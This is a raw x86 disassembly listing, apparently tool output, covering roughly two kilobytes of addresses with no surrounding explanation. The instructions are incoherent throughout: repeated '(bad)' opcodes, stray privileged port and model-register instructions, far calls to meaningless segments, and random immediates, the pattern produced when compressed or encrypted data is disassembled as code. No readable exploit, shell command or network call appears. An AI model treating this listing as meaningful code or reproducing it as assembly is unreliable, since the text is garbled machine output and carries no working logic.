  41528d:	mov    dl,0x66
  41528f:	cs retf 0x823
  415293:	cmp    DWORD PTR [esi+ecx*1+0x63782237],eax
  41529a:	jo     0x41524c
  41529c:	shl    DWORD PTR [ecx],0xa0
  41529f:	push   edx
  4152a0:	mov    ah,0x8
  4152a2:	bound  esp,QWORD PTR [eax-0x51]
  4152a5:	mov    al,ds:0x56d043aa
  4152aa:	mov    esp,0x54224e00
  4152af:	out    dx,al
  4152b0:	jg     0x4152bb
  4152b2:	sub    al,0x30
  4152b4:	pusha  
  4152b5:	ficom  WORD PTR [ecx-0x104e0bef]
  4152bb:	add    BYTE PTR [ebx],dh
  4152bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152be:	fsub   DWORD PTR [esi]
  4152c0:	pop    eax
  4152c1:	pusha  
  4152c2:	cmp    ch,BYTE PTR [esi-0x3b8186b7]
  4152c8:	add    ebx,edx
  4152ca:	jl     0x415334
  4152cc:	and    al,BYTE PTR [edx+0x41]
  4152cf:	xchg   BYTE PTR fs:[esi+ecx*1],bl
  4152d3:	stos   BYTE PTR es:[edi],al
  4152d4:	sbb    edx,DWORD PTR [eax+0x5a]
  4152d7:	out    dx,al
  4152d8:	bound  esi,QWORD PTR [eax+0x38]
  4152db:	mov    dh,0xa6
  4152dd:	addr16 loop 0x415287
  4152e0:	add    al,0x28
  4152e2:	jl     0x41530c
  4152e4:	fisubr DWORD PTR [eax+0x3415b4b1]
  4152ea:	push   cs
  4152eb:	or     eax,0x34161e9c
  4152f0:	call   0x2c4:0x5ba86b8a
  4152f7:	xchg   esi,eax
  4152f8:	ror    eax,1
  4152fa:	sbb    eax,0xa3c136d6
  4152ff:	mov    DWORD PTR [eax+0x7660b6e8],ebp
  415305:	mov    al,ds:0x9f2a1e0a
  41530a:	or     BYTE PTR [eax+esi*4+0x6a16e823],ch
  415311:	mov    ch,0xf2
  415313:	stos   DWORD PTR es:[edi],eax
  415314:	xchg   ebp,eax
  415315:	or     DWORD PTR [ecx+0x4000c098],esp
  41531b:	rcl    BYTE PTR [ebp+0x7b79a15e],1
  415321:	xchg   esp,eax
  415322:	sahf   
  415323:	jle    0x415313
  415325:	enter  0xb000,0xad
  415329:	out    0xd0,eax
  41532b:	retf   
  41532c:	hlt    
  41532d:	push   esp
  41532e:	and    bl,dl
  415330:	xor    esi,esi
  415332:	or     DWORD PTR [edx],0x70
  415335:	add    BYTE PTR [eax+eax*2+0x64],cl
  415339:	adc    BYTE PTR [edx],dl
  41533b:	push   esi
  41533c:	sbb    ch,BYTE PTR [edx+0x7b188b14]
  415342:	fild   WORD PTR [esi+0x4e]
  415345:	call   0x9cdc8aee
  41534a:	(bad)  
  41534b:	sbb    ebp,DWORD PTR [eax+edi*1]
  41534e:	fiadd  WORD PTR [eax]
  415350:	lock push 0x1fa37c0a
  415356:	push   0x4cca14a6
  41535b:	mov    ds,WORD PTR [esi-0x19]
  41535e:	jg     0x415333
  415360:	xchg   ebx,eax
  415361:	adc    edx,0x345e9b3a
  415367:	test   BYTE PTR [eax],al
  415369:	sbb    al,0x8b
  41536b:	add    BYTE PTR [edx+0x682534ed],cl
  415371:	call   0xd553d819
  415376:	xchg   ebx,eax
  415377:	fdiv   DWORD PTR [ebp+eiz*1-0x5f]
  41537b:	inc    eax
  41537c:	test   esp,esi
  41537e:	jl     0x4153e4
  415380:	mov    eax,ds:0x84a2ace
  415385:	sub    esi,DWORD PTR [eax]
  415387:	dec    edx
  415388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415389:	sub    al,0x2
  41538b:	mov    al,0x45
  41538d:	push   ebp
  41538e:	or     eax,0x231efc98
  415393:	xchg   BYTE PTR [ebp-0x767a05b2],ch
  415399:	sub    sp,WORD PTR [esi-0x41]
  41539d:	mov    BYTE PTR [edx-0x25c16697],dl
  4153a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153a4:	push   edi
  4153a5:	shl    DWORD PTR [ebp+0x5e74de5a],0xcf
  4153ac:	imul   esi,DWORD PTR [edx-0x426f6bb3],0x12
  4153b3:	hlt    
  4153b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153b5:	call   0xd101d8ae
  4153ba:	mov    al,ds:0xf89e5c24
  4153bf:	mov    esp,0x970eda02
  4153c4:	aam    0x56
  4153c6:	data16 adc dl,dh
  4153c9:	jbe    0x415427
  4153cb:	dec    ebp
  4153cc:	lods   eax,DWORD PTR ds:[esi]
  4153cd:	jecxz  0x415351
  4153cf:	mov    dl,0x79
  4153d1:	test   al,0xaa
  4153d3:	les    ecx,FWORD PTR [ecx]
  4153d5:	mov    al,ds:0x2b612425
  4153da:	mov    dl,0x32
  4153dc:	mov    eax,0xd40a4fa4
  4153e1:	jno    0x41543d
  4153e3:	and    DWORD PTR [esi],esp
  4153e5:	lock xchg BYTE PTR [ebx+0x5b43b816],dh
  4153ec:	rol    BYTE PTR [ebx+ebp*4+0x2a],0xc2
  4153f1:	bound  edi,QWORD PTR [eax-0x3e]
  4153f4:	and    dh,BYTE PTR [ecx]
  4153f6:	shl    BYTE PTR [ecx-0x53],1
  4153f9:	in     eax,dx
  4153fa:	sub    BYTE PTR [esi],dl
  4153fc:	dec    esp
  4153fd:	xchg   edi,eax
  4153fe:	lods   al,BYTE PTR ds:[esi]
  4153ff:	retf   0x9686
  415402:	out    0xe,al
  415404:	mov    eax,ds:0x48b0dfe6
  415409:	inc    ebp
  41540a:	add    ah,ch
  41540c:	test   BYTE PTR [eax],al
  41540e:	xor    DWORD PTR [esi*4+0x8237044],0x7a4000d
  415419:	call   0xc543e2de
  41541e:	inc    edi
  41541f:	repz out dx,al
  415421:	dec    eax
  415422:	cld    
  415423:	or     al,0x66
  415425:	dec    ecx
  415426:	or     DWORD PTR [eax+0x6d1292e1],esi
  41542c:	add    ah,BYTE PTR [esp+eax*8]
  41542f:	ror    BYTE PTR [eax],1
  415431:	sub    BYTE PTR [esp+esi*2+0x62],al
  415435:	sbb    BYTE PTR [eax+0x16],bl
  415438:	sub    BYTE PTR [ebp-0x47],al
  41543b:	lock mov ds:0x35427678,al
  415441:	push   eax
  415442:	iret   
  415443:	adc    cl,BYTE PTR [edx-0x27f4772f]
  415449:	sbb    bl,BYTE PTR [edx-0x650293ab]
  41544f:	and    cl,BYTE PTR [ebp+0x2dacc28c]
  415455:	or     ch,BYTE PTR [eax+ecx*1]
  415458:	push   ds
  415459:	nop
  41545a:	mov    WORD PTR [edi],ds
  41545c:	sub    DWORD PTR [ebp+ebp*1-0x8],edx
  415460:	adc    al,0x2a
  415462:	push   esp
  415463:	test   eax,0x4e90d57a
  415468:	(bad)  
  415469:	push   ss
  41546a:	fdiv   st,st(6)
  41546c:	or     eax,0x7094ee16
  415471:	xor    eax,0x32e81e6a
  415476:	(bad)  
  415477:	xchg   ebx,eax
  415478:	mov    cl,0xc0
  41547a:	pop    eax
  41547b:	inc    edx
  41547c:	outs   dx,DWORD PTR ds:[esi]
  41547d:	inc    esp
  41547e:	ss pusha 
  415480:	mov    esp,0xbca8503d
  415485:	(bad)  
  415487:	adc    edx,DWORD PTR [eax]
  415489:	dec    edx
  41548a:	nop
  41548b:	add    BYTE PTR [eax+0x56241f1d],ah
  415491:	shl    BYTE PTR [ebx],1
  415493:	pusha  
  415494:	ret    0x5ae4
  415497:	out    dx,eax
  415498:	xor    BYTE PTR [ebp+0x12],ch
  41549b:	ins    DWORD PTR es:[edi],dx
  41549c:	mov    eax,0xca740810
  4154a1:	jb     0x41545c
  4154a3:	or     dl,BYTE PTR [edx+edx*1+0x30]
  4154a7:	pop    ecx
  4154a8:	pop    edx
  4154a9:	mov    ah,0x76
  4154ab:	cmp    al,BYTE PTR [ecx+0x1f]
  4154ae:	and    eax,0x38714e22
  4154b3:	dec    ecx
  4154b4:	mov    al,0xa1
  4154b6:	sar    dh,1
  4154b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154b9:	xor    bl,BYTE PTR [ebp+0x22]
  4154bc:	pushf  
  4154bd:	inc    edx
  4154be:	push   eax
  4154bf:	and    DWORD PTR [edx+0x64ac7b76],esp
  4154c5:	(bad)  
  4154c6:	bound  ecx,QWORD PTR [ebx+0x50]
  4154c9:	inc    eax
  4154ca:	push   0x595e9c82
  4154cf:	ror    BYTE PTR [ebx-0x4b],0x4a
  4154d3:	xor    al,0x8b
  4154d5:	mov    dh,0xeb
  4154d7:	outs   dx,DWORD PTR ds:[esi]
  4154d8:	and    BYTE PTR ds:[ecx+0x34a3e8e9],al
  4154df:	lods   al,BYTE PTR ds:[esi]
  4154e0:	inc    esi
  4154e1:	xor    eax,0x122b26b6
  4154e6:	ins    BYTE PTR es:[edi],dx
  4154e7:	ret    0xa52
  4154ea:	sub    BYTE PTR [ecx+esi*1-0x3052504e],ch
  4154f1:	add    al,0x8a
  4154f3:	push   esp
  4154f4:	sub    ebx,edx
  4154f6:	mov    DWORD PTR [eax+0x38],ecx
  4154f9:	sub    eax,0xc578005c
  4154fe:	rol    BYTE PTR [ecx+0x4434054d],cl
  415504:	sbb    eax,edi
  415506:	or     dh,BYTE PTR [ebp-0x7f]
  415509:	lods   eax,DWORD PTR ds:[esi]
  41550a:	or     al,dl
  41550c:	test   DWORD PTR [esi+0x3b],esi
  41550f:	xor    dh,BYTE PTR [ebx+0x3a]
  415512:	imul   esi,DWORD PTR [ebp-0x7794f17e],0xefa8ca66
  41551c:	cmp    al,0xa5
  41551e:	mov    BYTE PTR [ecx-0x65],al
  415521:	xchg   DWORD PTR [eax+0x640ca0ad],eax
  415527:	push   ebp
  415528:	add    eax,0x6ae72263
  41552d:	test   BYTE PTR [edx+0x5a],0x64
  415531:	adc    BYTE PTR [eax+edi*8+0x793afad2],ah
  415538:	jo     0x4154f1
  41553a:	test   BYTE PTR [ebp+edx*2+0x3683e306],0xa4
  415542:	jbe    0x415555
  415544:	fs scas al,BYTE PTR es:[edi]
  415546:	mov    eax,0xa260f100
  41554b:	stc    
  41554c:	sbb    BYTE PTR [ecx+0x46bf3e00],dl
  415552:	jb     0x4154d9
  415554:	and    BYTE PTR [esi],al
  415556:	loopne 0x415532
  415558:	ins    BYTE PTR es:[edi],dx
  415559:	mov    al,0x21
  41555b:	pop    esp
  41555c:	test   BYTE PTR [eax],ah
  41555e:	pusha  
  41555f:	das    
  415560:	es call 0x55ee:0x472f0065
  415568:	aam    0x50
  41556a:	and    DWORD PTR [edx-0x16cd4e18],ebx
  415570:	xchg   BYTE PTR [ebx],dl
  415572:	add    bh,BYTE PTR [eax+0x4c5e8128]
  415578:	dec    esp
  415579:	cmp    DWORD PTR [esp+edx*2],esp
  41557c:	mov    ah,0x4d
  41557e:	cli    
  41557f:	xchg   ecx,eax
  415580:	(bad)  
  415581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415582:	jo     0x415589
  415584:	rol    DWORD PTR ds:0x28ddb8a1,0x94
  41558b:	(bad)  
  41558c:	xchg   ebx,eax
  41558d:	shr    DWORD PTR [edx-0x1],1
  415590:	mov    ah,0xf6
  415592:	scas   al,BYTE PTR es:[edi]
  415593:	imul   esp,eax,0x59
  415596:	mov    bh,0xc
  415598:	jp     0x4155da
  41559a:	push   edx
  41559b:	jecxz  0x4155af
  41559d:	imul   ebp,DWORD PTR [ebp-0x7631be5d],0x5a
  4155a4:	mov    BYTE PTR [edx+0x4d],ch
  4155a7:	loop   0x4155ac
  4155a9:	(bad)  
  4155aa:	sbb    bl,BYTE PTR es:[edx]
  4155ad:	ins    BYTE PTR es:[edi],dx
  4155ae:	outs   dx,BYTE PTR ds:[esi]
  4155af:	cmp    DWORD PTR [esi-0x22b28b0],edi
  4155b5:	loopne 0x4155b7
  4155b7:	adc    al,0x9d
  4155b9:	fidivr DWORD PTR [edx+0x2b4e0d6]
  4155bf:	imul   esi,DWORD PTR [edx],0xffffffa0
  4155c2:	sbb    edi,DWORD PTR [eax+0x296a9c42]
  4155c8:	in     eax,dx
  4155c9:	mov    dl,0xd6
  4155cb:	imul   edi,DWORD PTR [eax+0x5c],0xfe9ae91c
  4155d2:	pop    esp
  4155d3:	test   al,0x36
  4155d5:	stos   DWORD PTR es:[edi],eax
  4155d6:	js     0x415600
  4155d8:	out    dx,al
  4155d9:	and    al,0xf6
  4155db:	pop    esi
  4155dc:	cmp    ebx,DWORD PTR [eax-0x54]
  4155df:	xchg   esp,eax
  4155e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155e1:	push   ebp
  4155e2:	or     al,cl
  4155e4:	mov    edx,0xc8403f74
  4155e9:	push   ds
  4155ea:	ror    DWORD PTR [ebp-0x1be2f252],0x51
  4155f1:	cmp    al,cl
  4155f3:	je     0x41563f
  4155f5:	mov    ss,WORD PTR [ecx-0x53]
  4155f8:	push   cs
  4155f9:	psadbw mm4,QWORD PTR [ebp+0x53]
  4155fd:	lahf   
  4155fe:	sub    bl,BYTE PTR [edx+esi*8]
  415601:	pop    es
  415602:	pop    edx
  415603:	fstp   TBYTE PTR [esi-0x7d3ba496]
  415609:	jge    0x4155f3
  41560b:	fadd   DWORD PTR [edx+0xf85a08f]
  415611:	push   0xffffffd3
  415613:	jmp    0x92b03846
  415618:	ja     0x415670
  41561a:	je     0x415630
  41561c:	cwde   
  41561d:	inc    edx
  41561e:	lock repnz and al,0x19
  415622:	or     ah,BYTE PTR [eax+0x36]
  415625:	or     eax,0x3816071d
  41562a:	dec    esp
  41562b:	jle    0x41562f
  41562d:	cwde   
  41562e:	pop    ebp
  41562f:	mov    al,ds:0x586a2b68
  415634:	mov    bl,0x7a
  415636:	shl    esp,1
  415638:	aad    0x94
  41563a:	cwde   
  41563b:	sub    eax,0x4cf5d42a
  415640:	adc    al,BYTE PTR [edi]
  415642:	into   
  415643:	lds    ebp,FWORD PTR [esi]
  415645:	int    0x86
  415647:	mov    dh,0xa8
  415649:	ret    
  41564a:	xor    al,0x72
  41564c:	mov    esi,0x282b99fe
  415651:	imul   edi,DWORD PTR [eax],0x9a986851
  415657:	test   BYTE PTR [edi],bl
  415659:	mov    al,ds:0x210c58ae
  41565e:	cmp    al,0x4
  415660:	xor    al,BYTE PTR [ebx-0x48ae331c]
  415666:	aam    0xd
  415668:	mov    dh,0x5e
  41566a:	push   esp
  41566b:	dec    ebx
  41566c:	mov    esp,0x5960aa32
  415671:	les    edi,FWORD PTR [edx+ebp*2-0x62]
  415675:	inc    esp
  415676:	popa   
  415677:	stos   DWORD PTR es:[edi],eax
  415678:	mov    eax,0xb2be6d56
  41567d:	xchg   esp,eax
  41567e:	sub    al,0xcc
  415680:	fadd   DWORD PTR [esi+0x4434fb0a]
  415686:	mov    eax,ds:0x8cb40f4
  41568b:	es or  al,0x4c
  41568e:	adc    al,0xbc
  415690:	dec    eax
  415691:	and    al,0x66
  415693:	es pop ss
  415695:	mov    al,0x0
  415697:	cli    
  415698:	push   es
  415699:	xor    DWORD PTR [edi+ebx*1+0x22c83602],0x399c6ebb
  4156a4:	(bad)  
  4156a5:	sub    ah,BYTE PTR [ecx]
  4156a7:	or     DWORD PTR [ebp-0x15255fb8],0x2d554daa
  4156b1:	ins    DWORD PTR es:[edi],dx
  4156b2:	or     al,0x6c
  4156b4:	add    al,BYTE PTR [edx-0x24e7607e]
  4156ba:	adc    eax,DWORD PTR [ebp+ecx*2+0x36c061b8]
  4156c1:	bound  edx,QWORD PTR [esi]
  4156c3:	je     0x41567e
  4156c5:	test   al,0xd8
  4156c7:	push   ecx
  4156c8:	pusha  
  4156c9:	jl     0x415725
  4156cb:	inc    ebp
  4156cc:	fsubrp st(5),st
  4156ce:	mov    BYTE PTR [edx-0x14],ch
  4156d1:	jecxz  0x4156d4
  4156d3:	shl    BYTE PTR [esi],0xc6
  4156d6:	rcl    BYTE PTR [ebx],1
  4156d8:	cmp    BYTE PTR [esi],ah
  4156da:	push   eax
  4156db:	xchg   cl,dl
  4156dd:	push   0x4e
  4156df:	in     al,0x94
  4156e1:	mov    ?,edx
  4156e3:	sub    BYTE PTR [esi],bh
  4156e5:	adc    bl,ch
  4156e7:	mov    al,0xce
  4156e9:	fidiv  WORD PTR [ecx+0x2d0d1087]
  4156ef:	mov    cl,BYTE PTR ds:0x973bb578
  4156f5:	jp     0x415709
  4156f7:	sub    al,BYTE PTR [edi+ebx*4-0x77]
  4156fb:	xchg   ecx,eax
  4156fc:	sbb    bh,ah
  4156fe:	scas   eax,DWORD PTR es:[edi]
  4156ff:	loopne 0x415683
  415701:	into   
  415702:	mov    dh,0x2a
  415704:	pop    ebx
  415705:	shl    BYTE PTR [eax+0x4245ade],1
  41570b:	pop    esi
  41570c:	neg    BYTE PTR [ebp-0x4e]
  41570f:	retf   
  415710:	sbb    al,BYTE PTR [ebp-0x9483be6]
  415716:	dec    edx
  415717:	bnd jl 0x41569c
  41571a:	mov    eax,ds:0x56b542d1
  41571f:	jne    0x4156cb
  415721:	or     ebp,DWORD PTR [edi+0x8]
  415724:	inc    ebp
  415725:	mov    al,bl
  415727:	xchg   edx,eax
  415728:	and    BYTE PTR [ecx+0x1],dl
  41572b:	push   esp
  41572c:	mov    dh,0xb8
  41572e:	mov    BYTE PTR [esi],0x51
  415731:	imul   ebp,DWORD PTR [eax],0xfffffff8
  415734:	loopne 0x415792
  415736:	sar    BYTE PTR ss:[eax],0xe1
  41573a:	retf   0x92a6
  41573d:	or     ebx,DWORD PTR [edx-0x13bfbd28]
  415743:	push   0xffffff87
  415745:	xchg   esi,eax
  415746:	mov    ds:0x2fc25a0a,eax
  41574b:	adc    DWORD PTR [esi-0x7ffe00c3],esi
  415751:	add    eax,0x466838ed
  415756:	add    eax,0xf66d172a
  41575b:	not    BYTE PTR [ecx]
  41575d:	fcomp  st(2)
  41575f:	ror    BYTE PTR [eax+ebx*8-0x12],cl
  415763:	test   eax,0x3b531480
  415768:	add    cl,0x83
  41576b:	mov    DWORD PTR [edx+0xd5627c],esp
  415771:	mov    cl,0xe4
  415773:	pop    esi
  415774:	push   ecx
  415775:	push   0x478e0f5b
  41577a:	jnp    0x415734
  41577c:	lds    edx,FWORD PTR [esi+0x5123b0e]
  415782:	lar    esi,sp
  415785:	cmp    al,0xf6
  415787:	sbb    cl,BYTE PTR [edx]
  415789:	call   0xfd7c:0xdaa010d8
  415790:	shl    BYTE PTR [esi-0x15],0x26
  415794:	sbb    al,0x2
  415796:	ret    0x76fc
  415799:	xchg   esp,eax
  41579a:	loopne 0x4157ac
  41579c:	shr    BYTE PTR [edx],0xc0
  41579f:	aad    0xc7
  4157a1:	call   0xa0:0x2450099d
  4157a8:	test   DWORD PTR [esi],ebp
  4157aa:	xchg   esi,eax
  4157ab:	pop    esi
  4157ac:	scas   eax,DWORD PTR es:[edi]
  4157ad:	mov    ah,0xa0
  4157af:	mov    eax,ds:0xa7568282
  4157b4:	cmp    al,0xd
  4157b6:	test   BYTE PTR [edx-0x5b248a7b],ah
  4157bc:	xor    BYTE PTR [ecx+0x34],ah
  4157bf:	(bad)  
  4157c0:	mov    al,ds:0xed827e88
  4157c5:	inc    ebx
  4157c6:	int    0x2e
  4157c8:	mov    esp,0xf612b969
  4157cd:	sbb    eax,0x55055c52
  4157d2:	or     eax,0x89b961d
  4157d7:	push   0x3fead242
  4157dc:	sub    BYTE PTR [eax],ch
  4157de:	push   0x52799a6a
  4157e3:	mov    ?,WORD PTR [eax]
  4157e5:	push   eax
  4157e6:	mov    ds:0x199b605b,al
  4157eb:	test   al,0x16
  4157ed:	ficomp DWORD PTR [esp+eiz*2]
  4157f0:	xchg   ecx,eax
  4157f1:	pop    ds
  4157f2:	sbb    al,0x56
  4157f4:	aam    0xd5
  4157f6:	push   eax
  4157f7:	ficomp WORD PTR [edx-0xb313b1a]
  4157fd:	in     al,dx
  4157fe:	mov    WORD PTR [edx-0x2f],gs
  415801:	add    ebp,edx
  415803:	xchg   BYTE PTR [eax],cl
  415805:	mov    esp,0x2ed8ca3c
  41580a:	hlt    
  41580b:	pop    ecx
  41580c:	and    ebp,ecx
  41580e:	pop    ss
  41580f:	into   
  415810:	inc    BYTE PTR [ecx-0x7a]
  415813:	cmp    ebx,edx
  415815:	adc    DWORD PTR [esi-0x46],esi
  415818:	xchg   edi,eax
  415819:	mov    edi,0xed82548a
  41581e:	cmp    al,0x98
  415820:	ret    
  415821:	push   esp
  415822:	fmul   DWORD PTR [ebx+0x12]
  415825:	hlt    
  415826:	lods   al,BYTE PTR ds:[esi]
  415827:	mov    dh,0x34
  415829:	shr    BYTE PTR [ebx],1
  41582b:	cmp    BYTE PTR [edx],dl
  41582d:	ss push esp
  41582f:	cmp    bl,BYTE PTR [ebx]
  415831:	outs   dx,BYTE PTR ds:[esi]
  415832:	xor    eax,0x429bcc5c
  415837:	pusha  
  415838:	sub    BYTE PTR [edx+ebp*4+0x34],ch
  41583c:	popa   
  41583d:	je     0x415893
  41583f:	rcr    dl,0xa6
  415842:	and    BYTE PTR [ebx+0x45e2cd7e],0x3b
  415849:	dec    esp
  41584a:	loope  0x4157e6
  41584c:	add    esi,DWORD PTR [ecx-0x1d93521f]
  415852:	xor    al,0x51
  415854:	mov    ds:0xf3e0100,al
  415859:	mov    edx,eax
  41585b:	ss xor ecx,edx
  41585e:	in     al,dx
  41585f:	push   0x3f5eb8ef
  415864:	jle    0x415836
  415866:	fwait
  415867:	jns    0x41583a
  415869:	wrmsr  
  41586b:	adc    bl,dh
  41586d:	cmp    bl,BYTE PTR [edx-0x730fff60]
  415873:	inc    esp
  415874:	inc    edi
  415875:	push   edi
  415876:	inc    ecx
  415877:	daa    
  415878:	push   es
  415879:	fcmovnb st,st(2)
  41587b:	mov    edx,0x63c08da8
  415880:	or     BYTE PTR [ebp+0x7e],dl
  415883:	push   ds
  415884:	sbb    cl,BYTE PTR [ebp-0x56]
  415887:	xor    DWORD PTR [esi+0x3ba211e0],0x6478e172
  415891:	sbb    BYTE PTR [ecx+edx*4],dh
  415894:	mov    edx,0x2888ea95
  415899:	inc    esp
  41589a:	arpl   WORD PTR [ebx-0xd],bp
  41589d:	aaa    
  41589e:	in     al,dx
  41589f:	(bad)  
  4158a0:	sbb    al,0x0
  4158a2:	sub    BYTE PTR [ebx+0x0],dl
  4158a5:	lahf   
  4158a6:	ror    ch,cl
  4158a8:	rol    BYTE PTR [ebp+ebp*2-0x39],1
  4158ac:	(bad)  
  4158ad:	add    al,0xb4
  4158af:	dec    esp
  4158b0:	xlat   BYTE PTR ds:[ebx]
  4158b1:	call   0xf1d5:0x250e609a
  4158b8:	dec    esi
  4158b9:	mov    eax,eax
  4158bb:	js     0x415881
  4158bd:	push   esp
  4158be:	mov    DWORD PTR [esi+0x50],edx
  4158c1:	test   DWORD PTR [eax-0x3651181e],esi
  4158c7:	fs add al,0xf0
  4158ca:	add    BYTE PTR [edx+0x2f],ch
  4158cd:	in     al,dx
  4158ce:	mov    ch,0x8d
  4158d0:	cli    
  4158d1:	jns    0x415879
  4158d3:	jns    0x415866
  4158d5:	and    al,0xa1
  4158d7:	std    
  4158d8:	xor    al,0xca
  4158da:	mov    eax,0xb8bb104e
  4158df:	push   esi
  4158e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158e1:	jno    0x41592b
  4158e3:	dec    edi
  4158e4:	scas   al,BYTE PTR es:[edi]
  4158e5:	shr    DWORD PTR [esi+ecx*4-0x6faf17ae],0x4e
  4158ed:	jle    0x415884
  4158ef:	es sti 
  4158f1:	add    BYTE PTR [ebp-0x6e],dl
  4158f4:	(bad)  
  4158f5:	fdivr  DWORD PTR [edx]
  4158f7:	stos   DWORD PTR es:[edi],eax
  4158f8:	adc    BYTE PTR [esi],0x1d
  4158fb:	test   DWORD PTR ds:0xefe7a1dd,ecx
  415901:	cmp    eax,0x1649607a
  415906:	pop    ebp
  415907:	sbb    DWORD PTR [eax+0x69],ebx
  41590a:	pushf  
  41590b:	push   0xa0860067
  415910:	or     eax,0x5e6aad4d
  415915:	les    ebp,FWORD PTR cs:[eax]
  415918:	pop    esp
  415919:	cmp    BYTE PTR [edi],ah
  41591b:	out    0x68,eax
  41591d:	pop    edx
  41591e:	shl    cl,1
  415920:	push   esi
  415921:	xchg   edi,eax
  415922:	sbb    BYTE PTR [esi+eax*8],dh
  415925:	sbb    bh,BYTE PTR [eax+ebx*2+0x55db0672]
  41592c:	in     eax,0xcc
  41592e:	shl    BYTE PTR ds:0xcaa5f598,cl
  415934:	mov    WORD PTR [esi+0x34],ss
  415937:	mov    eax,0xbc66dd89
  41593c:	clc    
  41593d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41593e:	mov    ebx,0x1f450d0f
  415943:	push   ss
  415944:	es aas 
  415946:	cmp    BYTE PTR [edi+0x32],bh
  415949:	mov    bl,0xbc
  41594b:	jmp    0xbeacda57
  415950:	push   es
  415951:	popf   
  415952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415953:	retf   
  415954:	add    ch,bh
  415956:	fs xchg edi,eax
  415958:	rcl    eax,1
  41595a:	aad    0xf8
  41595c:	fidiv  DWORD PTR [esi+eax*4]
  41595f:	aaa    
  415960:	out    dx,al
  415961:	adc    al,0x35
  415963:	jl     0x41594f
  415965:	mov    dl,0x43
  415967:	loop   0x4159ca
  415969:	repnz mov DWORD PTR [eax],esp
  41596c:	jl     0x415915
  41596e:	mov    ch,0x40
  415970:	add    al,0x46
  415972:	mov    ds:0x3a5cf2a7,al
  415977:	or     al,0x8b
  415979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41597a:	pushf  
  41597b:	in     al,0x47
  41597d:	clc    
  41597e:	pushf  
  41597f:	aaa    
  415980:	inc    esp
  415981:	and    eax,0x96fa2a0a
  415986:	ins    BYTE PTR es:[edi],dx
  415987:	enter  0xd530,0x41
  41598b:	call   0x2d5da384
  415990:	int    0x71
  415992:	dec    ebx
  415993:	rcl    BYTE PTR [edx+0x14],1
  415996:	xor    al,0x72
  415998:	scas   al,BYTE PTR es:[edi]
  415999:	push   esp
  41599a:	fild   WORD PTR [esi+esi*4]
  41599d:	test   BYTE PTR [eax-0x5e],0xb6
  4159a1:	add    bl,BYTE PTR [edi+ecx*4]
  4159a4:	(bad)
  4159a8:	fadd   QWORD PTR [edi+0x2]
  4159ab:	mov    esi,0x6c529a99
  4159b0:	xor    al,BYTE PTR [eax]
  4159b2:	scas   eax,DWORD PTR es:[edi]
  4159b3:	mov    ebx,0x4db4fc16
  4159b8:	sbb    BYTE PTR [ebp+0x5c],0x17
  4159bc:	aam    0xcc
  4159be:	push   edx
  4159bf:	sbb    ah,BYTE PTR [esi+eiz*4]
  4159c2:	xlat   BYTE PTR ds:[ebx]
  4159c3:	dec    ebp
  4159c4:	adc    al,0xb4
  4159c6:	add    bh,BYTE PTR [edx]
  4159c8:	add    eax,DWORD PTR [esi+0xe]
  4159cb:	imul   BYTE PTR ds:0x2ebad1d5
  4159d1:	push   ds
  4159d2:	push   eax
  4159d3:	mov    WORD PTR [esi+0x21781b10],gs
  4159d9:	gs push es
  4159db:	sbb    al,0x4a
  4159de:	call   0xa14:0x8cbeb28b
  4159e5:	pop    esi
  4159e6:	test   BYTE PTR [edi],bl
  4159e8:	stc    
  4159e9:	add    BYTE PTR [edx+0x48],dh
  4159ec:	loope  0x415a60
  4159ee:	fmul   DWORD PTR [ebx]
  4159f0:	or     edi,DWORD PTR [ebx+0x240a6b92]
  4159f6:	push   eax
  4159f7:	(bad)  [edx]
  4159f9:	cmp    BYTE PTR [eax+ecx*1],ch
  4159fc:	add    BYTE PTR [eax-0xe],bh
  4159ff:	cmp    al,0x19
  415a01:	xlat   BYTE PTR ds:[ebx]
  415a02:	push   ss
  415a03:	(bad)  
  415a04:	mov    bh,0x7
  415a06:	loop   0x415a82
  415a08:	xor    al,0xc0
  415a0a:	retf   
  415a0b:	cmp    ecx,DWORD PTR [edx]
  415a0d:	or     al,0x14
  415a0f:	mov    bh,BYTE PTR [edx+0x78]
  415a12:	jmp    0x58417ddd
  415a17:	les    ebx,FWORD PTR [esi]
  415a19:	fwait
  415a1a:	ins    BYTE PTR es:[edi],dx
  415a1b:	or     DWORD PTR [esi-0x1b],ecx
  415a1e:	data16 or al,0x18
  415a21:	add    eax,0x3deafd14
  415a26:	xchg   ebx,eax
  415a27:	add    BYTE PTR [esi-0x54963d4],dh
  415a2d:	mov    dh,0x3a
  415a2f:	dec    ebp
  415a30:	enter  0xf4d6,0x8b
  415a34:	call   0x1e33:0xa6d9490
  415a3b:	push   edx
  415a3c:	mov    ah,0x46
  415a3e:	stos   DWORD PTR es:[edi],eax
  415a3f:	push   ss
  415a40:	pop    ebp
  415a41:	sbb    BYTE PTR [ebx],bh
  415a43:	nop
  415a44:	sbb    al,0x88
  415a46:	ss int 0xb0
  415a49:	push   0x964d03c
  415a4e:	sbb    ch,BYTE PTR [esi+0x70]
  415a51:	in     al,0xf8
  415a53:	ret    0xd123
  415a56:	dec    ecx
  415a57:	or     DWORD PTR [esp],ebx
  415a5a:	nop/reserved BYTE PTR [edx+0x24ad2b00]
  415a61:	cmc    
  415a62:	sub    esi,ebp
  415a64:	add    eax,0x92051cd1
  415a69:	mov    BYTE PTR [esi+0x5a6aae3f],ch
  415a6f:	mov    ah,0xf0
  415a71:	rcr    dl,cl
  415a73:	sub    al,BYTE PTR [esi]
  415a75:	adc    al,0x24
  415a77:	arpl   di,cx
  415a79:	adc    ecx,edx
  415a7b:	ins    BYTE PTR es:[edi],dx
  415a7c:	sti    
  415a7d:	push   esp
  415a7e:	ss xor al,0x2d
  415a81:	in     eax,dx
  415a82:	cli    
  415a83:	call   0xb5e31705
  415a88:	sbb    BYTE PTR [edx-0x44],0x34
  415a8c:	out    dx,eax
  415a8d:	sbb    al,0x50
